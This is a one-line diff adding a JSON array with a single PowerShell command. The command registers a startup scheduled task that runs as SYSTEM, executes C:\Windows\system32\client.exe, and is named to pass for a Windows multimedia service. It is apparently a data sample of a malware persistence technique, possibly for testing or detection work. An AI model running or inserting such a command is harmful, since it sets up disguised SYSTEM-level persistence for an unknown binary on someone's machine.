@@ -1,0 +1,1 @@
+["powershell -Command \"Register-ScheduledTask -TaskName Microsoft\\Windows\\Multimedia\\SystemMediaService -Trigger (New-ScheduledTaskTrigger -AtStartup) -Action (New-ScheduledTaskAction -Execute 'C:\\Windows\\system32\\client.exe') -User SYSTEM\""]
